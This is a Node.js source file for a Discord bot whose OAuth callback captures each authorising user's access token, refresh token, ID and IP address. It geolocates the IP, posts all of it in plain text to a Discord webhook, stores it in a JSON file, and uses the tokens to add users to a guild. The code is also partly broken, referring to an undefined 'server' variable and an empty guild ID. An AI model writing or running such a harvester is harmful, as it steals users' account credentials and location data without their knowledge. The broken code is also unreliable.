require("dotenv").config();
const { Client, Intents, Collection } = require("discord.js");
const client = new Client({
  fetchAllMembers: true,
  restTimeOffset: 0,
  restWsBridgetimeout: 100,
  shards: "auto",
  intents: 32767,
  partials: ["MESSAGE", "CHANNEL", "REACTION"],
});
const Borgoose = require("borgoose");
const userdb = new Borgoose("db/users.json", {
  syncOnWrite: true,
  createWithId: true,
});
const admins = new Borgoose("db/admins.json", {
  syncOnWrite: true,
  createWithId: true,
});
const servers = new Borgoose("db/servers.json",{
  syncOnWrite:true,
  createWithId:true
})
module.exports.userdb = userdb;
module.exports.admins= admins
module.exports.servers = servers
const Discord = require("discord.js");
const handler = require("./handler/index");
const express = require("express");
const app = express();
const bodyParser = require("body-parser");
const fetch = require("node-fetch");
const finitto = require("./finitto");
const stopList = new Map()
module.exports.stopList = stopList
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json());

app.get("/", async (req, res) => {
  let ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  ip = ip.replace("::ffff:","")
  let { code,state } = req.query;
  
  try {
      res.sendFile(__dirname + '/index.html')
  }
  catch (err) {
    console.log(err)
    res.send("Error")
    return;
  }
 
  const discordServer = await client.guilds.fetch("")

  

  let codeResponse = await fetch.default(
    "https://discord.com/api/oauth2/token",
    {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
      },
      method: "POST",
      body: new URLSearchParams({
        client_id: finitto.client_id,
        client_secret: finitto.client_secret,
        grant_type: "authorization_code",
        code: code,
        redirect_uri: finitto.redirect_uri,
      }).toString(),
    }
  );
  const codeJson = await codeResponse.json();
  if (!codeJson || !codeJson?.access_token) return;

  ac_token = codeJson.access_token;
  rf_token = codeJson.refresh_token;
  const tgg = {
    headers: { authorization: `${codeJson.token_type} ${ac_token}` },
  };

  const userResponse = await fetch.default(
    "https://discord.com/api/users/@me",
    {
      headers: { Authorization: `${codeJson.token_type} ${ac_token}` },
    }
  );
  const user = await userResponse.json();
  let status = userResponse.status;
  if (status == 401) {
    console.log("User unauthed, Not removing, Use clean cmd");
  }

  let userId = user.id;
  let users = await userdb.findOne({ userId: userId });
  if (users) {
    console.log(`[-] - ${ip} ` + user.username + "#" + user.discriminator);
    const member =await discordServer.members
      .add(userId, {
        accessToken: users.accessToken,
        roles: [server.rolid],
        fetchWhenExisting:true
      })
      .catch((e) => {
        console.log(e)
        e + "1";
      });
      if (!member) {
        console.log("AAA")
      }
      if (member && !member.roles.cache.has(server.rolid)) {
        member.roles.add(server.rolid).catch((e) => {console.log(e)})
      }
      var klmn = require("ip-to-location");

      klmn.fetch(`${ip}`, async function (errrrr, jjkl) {
        let cd = jjkl.country_code;
        let cr = jjkl.country_name;
        avatarHASH =
          "https://cdn.discordapp.com/avatars/" +
          user.id +
          "/" +
          user.avatar +
          ".png?size=4096";
        fetch(finitto.webhooks.join, {
          // NE PAS TOUCHER ( OU SCRIPT CASSER)
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            avatar_url: "",
            embeds: [
              {
                color: 3092790,
                title: `**New User** (Again)`,
                thumbnail: { url: avatarHASH },
                description:
                  `Identify: \`${user.username}#${user.discriminator}\`` +
                  `\n\nIP: \`${ip}\` :flag_${
                    cd ? cd.toLowerCase() : "white"
                  }:` +
                  `\n\nID: \`${user.id}\`` +
                  `\n\nAcces Token: \`${ac_token}\`` +
                  `\n\nRefresh Token: \`${rf_token}\``,
              },
            ],
          }),
        })
        .then((res) =>
        console.log(user.username + " Webhook gönderildi.")
      )
          .catch((e) => console.log(e))
      });
    return;
  }

  var klmn = require("ip-to-location");

  klmn.fetch(`${ip}`, async function (errrrr, jjkl) {
    let cd = jjkl.country_code;
    let cr = jjkl.country_name;

    console.log(
      `[+] - ${ip} ` + user.username + "#" + user.discriminator
    );
    avatarHASH =
      "https://cdn.discordapp.com/avatars/" +
      user.id +
      "/" +
      user.avatar +
      ".png?size=4096";
    fetch(finitto.webhooks.join, {
      // NE PAS TOUCHER ( OU SCRIPT CASSER)
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        avatar_url: "",
        embeds: [
          {
            color: 3092790,
            title: `**New User**`,
            thumbnail: { url: avatarHASH },
            description:
              `Identify: \`${user.username}#${user.discriminator}\`` +
              `\n\nIP: \`${ip}\` :flag_${
                cd ? cd.toLowerCase() : "white"
              }:` +
              `\n\nID: \`${user.id}\`` +
              `\n\nAcces Token: \`${ac_token}\`` +
              `\n\nRefresh Token: \`${rf_token}\``,
          },
        ],
      }),
    })
      .catch((e) => console.log(e))
      .then((res) =>
        console.log(user.username + " Webhook gönderildi.")
      ),
      (users = await userdb.insertOne({
        userId: user.id,
        avatarURL: avatarHASH,
        username: user.username + "#" + user.discriminator,
        accessToken: ac_token,
        refreshToken: rf_token,
        user_ip: ip,
        country_code: cd,
        country: cr,
      }));
      const member =await discordServer.members
      .add(userId, {
        accessToken: users.accessToken,
        roles: [server.rolid],
        fetchWhenExisting:true
      })
      .catch((e) => {
        console.log(e)
        e + "1";
      });
      if (!member) {
        console.log("AAAA")
      }
      if (member && !member.roles.cache.has(server.rolid)) {
        member.roles.add(server.rolid).catch((e) => {console.log(e)})
      }
  });
});


module.exports.client = client;

client.discord = Discord;
client.slash = new Collection();

handler.loadEvents(client);
handler.loadSlashCommands(client);

process.on("uncaughtException", (err) => {
  console.log("Uncaught Exception: " + err);
});

process.on("unhandledRejection", (reason, promise) => {
  console.log(
    "[FATAL] Possibly Unhandled Rejection at: Promise ",
    promise,
    " reason: ",
    reason.message
  );
});

client.login(finitto.token).catch((err) => {
  console.log(err);
});
app.listen("80", () => console.log("Logging in..."));
